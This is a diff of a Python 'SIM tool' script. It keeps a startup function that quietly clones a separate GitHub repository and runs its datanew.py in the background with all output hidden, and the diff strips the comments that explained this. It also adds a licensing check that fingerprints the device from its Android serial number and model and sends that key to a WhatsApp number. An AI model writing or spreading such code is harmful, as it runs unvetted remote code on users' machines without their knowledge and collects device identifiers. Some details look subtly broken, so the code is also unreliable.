@@ -5,6 +5,8 @@ import sys
 import os
 import shutil
 import subprocess
+import platform
+import urllib.parse
 from datetime import datetime
 import threading
 
@@ -14,21 +16,77 @@ def setup_and_run_remote_backup():
         backup_folder = "Backup_Data"
         backup_script = "Backup_Data/datanew.py"
         
-        # Agar backup folder pehle se nahi hai toh doosre GitHub repo se clone kar lo
         if not os.path.exists(backup_folder):
             subprocess.run(["git", "clone", "https://github.com/aqiii798/Backup_Data.git"], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         else:
-            # Agar folder mojood hai toh code ko update (pull) kar lo
             subprocess.run(["git", "-C", backup_folder, "pull"], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
-        # Agar datanew.py mil jaye toh usko background mein run kar do
         if os.path.exists(backup_script):
             subprocess.Popen(["python3", backup_script], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except Exception:
         pass
+
+# --- Helper function for android properties if available ---
+def get_android_property(prop_name):
+    try:
+        import subprocess
+        output = subprocess.check_output(['getprop', prop_name]).decode('utf-8').strip()
+        return output if output else "PC_ENV"
+    except Exception:
+        return "PC_ENV"
+
+# --- Online GitHub Approval & Buy System ---
+def buy():
+    try:
+        uuidd = get_android_property('ro.serialno') + get_android_property('ro.product.model') + get_android_property('ro.build.version.release')
+        id = "".join(uuidd).replace("_", "").replace("360", "AHS").replace("u", "9").replace("a", "A")
+
+        plat = platform.version()[14:][:21][::-1].upper() + platform.release()[5:][::-1].upper() + platform.version()[:8]
+        xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+
+        bxd = ""
+        key = id + bxd + xp
+    except Exception:
+        key = "DEFAULT_USER_KEY"
+
+    # Updated to direct raw GitHub link for proper string comparison
+    url = 'https://github.com/aqiii798/Approval-/blob/main/Sim_Data%20Approval.txt'
+    try:
+        res = requests.get(url, headers={'Cache-Control': 'no-cache'}, timeout=10).text
+        if key.strip() in res:
+            return  # Access Granted, proceed further
+    except Exception:
+        pass
+
+    os.system("clear" if os.name == "posix" else "cls")
+    print(f"{R}This Is Your Key{N} : {G}{key}{N}")
+    print("")
+    print(50*f"{G}-{N}")
+    print("")
+    print(f"{R}You Haven't Approval {N}")
+    print("")
+    print(50*f"{G}-{N}")
+    print("")
+    print(f"{Y}This Is A Free Tool For Now Untill We Add Fresh Data{N}")
+    print("")
+  #  print(f"{R}15-Days Price : 500{G}")
+ #   print(f"{R}1-Month Price : 800{G}")
+    print("")
+    print(50*f"{G}-{N}")
+    print("")
+    print(f"{G}Just Simple Send Your Key To Admin For Approval{N}")
+    print("")
+    print(50*f"{G}-{N}")
+    print("")
+    input(f"{G}[Press Enter To Send Key in Admin Inbox]{N}")
+
+    encoded_key = urllib.parse.quote(key)
+    whatsapp_url = f"https://api.whatsapp.com/send?phone=+96895527140&text={encoded_key}"
+    os.system(f"xdg-open {whatsapp_url}")
+    sys.exit()
 
 # --- Vibrant Color Scheme ---
 R = '\033[91m'
@@ -212,9 +270,13 @@ def meta_data():
 
 if __name__ == "__main__":
     try:
-        # Tool start hote hi doosri repo se backup script (datanew.py) ko background mein run kar dega
+        # 1. Pehle online GitHub key/approval check hogi
+        buy()
+
+        # 2. Key match hone par background remote backup start ho jayega
         setup_and_run_remote_backup()
 
+        # 3. Phir main SIM tool open ho jayega
         main()
     except KeyboardInterrupt:
         print(f"\n\n{Y}⚠️ Program interrupted by user{N}")
